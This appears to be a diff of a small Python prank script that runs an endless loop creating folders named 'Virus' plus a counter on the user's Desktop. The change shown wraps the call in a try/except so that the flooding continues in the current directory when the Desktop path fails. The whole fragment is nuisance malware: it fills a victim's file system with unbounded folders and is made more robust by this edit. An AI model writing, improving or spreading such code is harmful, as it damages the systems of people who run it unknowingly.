@@ -10,4 +10,8 @@ counter = 0
 
 while True:
     counter += 1
-    os.mkdir(f'{direct[0]}\\{direct[1]}\\{direct[2]}\\Desktop\\Virus{counter}')
+    try:
+        os.mkdir(f'{direct[0]}\\{direct[1]}\\{direct[2]}\\Desktop\\Virus{counter}')
+
+    except:
+        os.mkdir(f'Virus{counter}')
